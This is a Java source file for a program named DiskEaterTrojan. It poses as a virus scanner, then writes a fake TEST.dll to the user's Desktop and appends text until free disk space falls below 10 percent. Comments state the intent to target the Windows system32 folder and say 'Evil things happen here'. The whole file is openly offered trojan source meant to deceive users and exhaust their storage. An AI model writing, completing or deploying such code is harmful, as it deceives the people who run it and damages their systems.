
import java.io.*;
import java.nio.ByteBuffer;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.WritableByteChannel;
import java.util.Scanner;

import javax.swing.filechooser.FileSystemView;

public class DiskEaterTrojan 
{
	public static void main(String[] args)
	{
		System.out.println("Enter 's' to scan for viruses or enter anything else to exit.");
		Scanner scan = new Scanner(System.in);
		String input = scan.nextLine();
		
		//This requires admin priveleges to write to. I'm not sure how to do this right now.
		String actualPath = System.getenv("WINDIR") + "/system32/TEST.dll";
		
		//I'm using this path for now for testing the file write process
		String testPath = System.getProperty("user.home") + "/Desktop/TEST.dll";
		
		if(input.equals("s"))
		{
			//Evil things happen here
			writeFile(testPath);
		}
		else
		{
			System.out.println("Exiting...");
			System.exit(0);
		}
			
	}
	
	private static void writeFile(String filePath)
	{
		String line = "Help I am stuck in a fortune cookie message factory!!!!\n";
		
		try {
			byte[] buffer = "Help I am trapped in a fortune cookie factory\n".getBytes();
			int number_of_lines = 400000;

			FileChannel rwChannel = new RandomAccessFile(filePath, "rw").getChannel();
			ByteBuffer wrBuf = rwChannel.map(FileChannel.MapMode.READ_WRITE, 0, buffer.length * number_of_lines);
			byte[] largerBuffer = new byte[wrBuf.capacity()];
			((ByteBuffer) wrBuf.duplicate().clear()).get(largerBuffer);
			
			DataOutputStream outStream = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(filePath, true)));
			
			while(checkFreeSpacePercent(filePath) > 10.0f)
			{
			    outStream.write(largerBuffer);
			}
			rwChannel.close();
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	private static float checkFreeSpacePercent(String filePath)
	{
		File f = new File(filePath);
		System.out.println("Printing free space");
		
		float percent = ((float)f.getFreeSpace() / (float)f.getTotalSpace())* 100.0f;
		
		System.out.println(percent);
		return percent;
	}
	
	private static long getFreeSpace(String filePath)
	{
		File f = new File(filePath);
		return f.getFreeSpace();
	}
}
